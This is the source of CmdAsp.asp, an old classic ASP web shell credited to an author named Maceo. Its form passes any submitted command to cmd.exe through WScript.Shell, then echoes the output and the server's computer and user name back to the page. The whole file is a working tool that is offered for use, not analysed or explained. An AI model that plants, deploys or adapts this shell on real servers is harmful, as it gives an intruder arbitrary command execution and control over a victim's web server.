<%@ Language=VBScript %>
<%
' --------------------o0o--------------------
' File: CmdAsp.asp
' Author: Maceo <maceo @ dogmile.com>
' Release: 2000-12-01
' OS: Windows 2000, 4.0 NT
' -------------------------------------------

Dim oScript
Dim oScriptNet
Dim oFileSys, oFile
Dim szCMD, szTempFile

On Error Resume Next

' -- create the COM objects that we will be using -- '
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

' -- check for a command that we have posted -- '
szCMD = Request.Form(".CMD")
If (szCMD <> "") Then
  ' -- Use a poor man's pipe ... a temp file -- '
  'szTempFile = "C:\" & oFileSys.GetTempName( )
  'szTempFile = Server.MapPath(".tmpfile2")
  szTempFile = Server.MapPath(".shell") & "\" & oFileSys.GetTempName( )
  'Call oScript.Run ("cmd.exe /c echo " & szCMD & " > " & szTempFile, 0, True) ' intWindowStyle=0, bWaitOnReturn=True 
  Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True) ' intWindowStyle=0, bWaitOnReturn=True
  Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
End If

%>
<HTML>
<BODY>
<H4>Maceo &lt;maceo@dogmile.com&gt; based CmdAsp shell.</H4>
<FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
<input type=text name=".CMD" size=45 value="<%= szCMD %>">
<input type=submit value="Run">
</FORM>
<PRE>
Current directory: <%= Server.MapPath(".") %>
Id: <%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
> <%= szCMD %>
<hr /><%
If (IsObject(oFile)) Then
  ' -- Read the output from our command and remove the temp file -- '
  On Error Resume Next
  Response.Write Server.HTMLEncode(oFile.ReadAll)
  oFile.Close
  Call oFileSys.DeleteFile(szTempFile, True)
Else
  Response.Write "Something failed."
End If
%><hr />
</BODY>
</HTML>
